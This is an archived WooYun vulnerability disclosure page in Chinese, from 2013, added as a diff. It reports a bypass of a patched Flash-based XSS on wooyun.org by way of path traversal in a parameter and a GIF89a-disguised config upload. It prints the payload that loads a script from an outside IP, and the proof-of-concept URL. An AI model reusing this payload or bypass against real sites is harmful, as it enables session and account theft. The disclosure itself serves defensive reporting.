@@ -1,0 +1,205 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		绕过乌云的一个防御继续xss  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		绕过乌云的一个防御继续xss  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的胖子">心伤的胖子</a> 
+</li><li>提交时间：		2013-08-27 13:48</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-16：	细节向普通白帽子公开<br/>
+									2013-09-26：	细节向实习白帽子公开<br/>
+									2013-10-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">老漏洞，再利用。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1、话说之前的在这里 http://zone.wooyun.org/content/5548，http://drops.wooyun.org/papers/382 到现在还有人问我要 wb 呢。<br />
+<br />
+2、之前的很快就修了，反正对当时肯定是没办法用了。可修复的到底是否彻底呢？来跟随胖子的脚步一起走进今天的《胖子玩蛋去》。<br />
+<br />
+3、直接访问之前的 flash 文件：http://www.wooyun.org/ofc/open-flash-chart.swf，页面返回“you know.”，能够显示正常的 URL 为：http://www.wooyun.org/ofc/open-flash-chart.swf?data=/ajaxdo.php?module=corptypecount%26type=%26id=2，我们大致可以判断是在 web server 层面做的访问控制。同时验证 flash 文件本身没有做任何修复处理。<br />
+<br />
+4、那就是说如果能够绕过 web server 的访问控制就又可以偷 wb 了，怎么绕过呢，这部分详细过程略过，大概的判断是限制的 data 参数的值，只允许 /ajaxdo.php 开头，在这个地方我们来感谢一下 pz 姐，找到了绕过的方法：http://www.wooyun.org/ofc/open-flash-chart.swf?data=/ajaxdo.php/../<br />
+<br />
+5、可是下面的问题是我们没有办法加载远程的配置文件了，www.wooyun.org 域下我们能够控制的就是“插入图片”，印象中乌云本身对图片会添加水印，这样就会对图片就行处理，中间尝试了下 http://zone.wooyun.org/content/5429 的方法由于我们的利用代码稍微多点导致一直失败，就此放弃？<br />
+<br />
+6、我能说不么，我印象中乌云对 GIF 格式的图片是不做处理了，到底是不是呢，插一下就知道了嘛。事实就是不做任何处理的，只要能够绕过这里那不就可以了么。<br />
+<br />
+7、下面还是之前的配置代码：<br />
+<br />
+</p><pre><code>&amp;title=腾讯高危漏洞一览表（点击类别可以查看详情）,{font-size:18px; color: #d01f3c}&amp;<br />
+&amp;x_axis_steps=1&amp;<br />
+&amp;y_ticks=50,50&amp;<br />
+&amp;line=2,#87421F&amp;<br />
+&amp;y_min=0&amp;<br />
+&amp;y_max=20&amp;<br />
+&amp;pie=60,#E4F0DB,{display:none;},1,,1&amp;<br />
+&amp;values=50,50&amp;<br />
+&amp;pie_labels=远程命令执行,腾讯客户端溢出&amp;<br />
+&amp;colours=#d01f3c,#356aa0&amp;<br />
+&amp;links=javascript:window.s=document.createElement(&#039;script&#039;);window.s.src=&#039;http://42.96.150.181/data.js&#039;;document.body.appendChild(window.s);,javascript:window.s=document.createElement(&#039;script&#039;);window.s.src=&#039;http://42.96.150.181/data.js&#039;;document.body.appendChild(window.s);&amp;<br />
+&amp;tool_tip=类别%3A+%23x_label%23%3Cbr%3E比例%3A+%23val%23%25&amp;</code></pre><p class='detail'><br />
+<br />
+直接写入文件改个后缀就上传那当然是不行的，可是在文件头加个 “GIF89a” 呢，事实证明是可以的。<br />
+<br />
+7、http://www.wooyun.org/upload/201308/26143517bb1ac5aec31698c69707e362404f314a.gif 这个就是我们上传的图片地址，直接访问不行因为有 referer 限制，不过对于我们去利用是没关系的，本身 flash 加载就带上 referer 的。<br />
+<br />
+8、最后的 POC 就是：http://www.wooyun.org/ofc/open-flash-chart.swf?data=/ajaxdo.php/../upload/201308/26143517bb1ac5aec31698c69707e362404f314a.gif<br />
+<br />
+多么熟悉的界面。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">http://www.wooyun.org/ofc/open-flash-chart.swf?data=/ajaxdo.php/../upload/201308/26143517bb1ac5aec31698c69707e362404f314a.gif<br />
+<br />
+如下图：<br />
+<br />
+</p><p class="detail"><a href="../images/2711275416769bb430fcae3c6116c3a2ce5e6ed3.png" target="_blank"><img src="../images/2711275416769bb430fcae3c6116c3a2ce5e6ed3.png" alt="wy.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、在 web server 层对 flash 的访问再严格点？<br />
+<br />
+2、修复 flash？ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的胖子" title="心伤的胖子">心伤的胖子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035370" title="绕过乌云的一个防御继续xss">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-08-27 14:48</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提交，已修复。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="35370";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
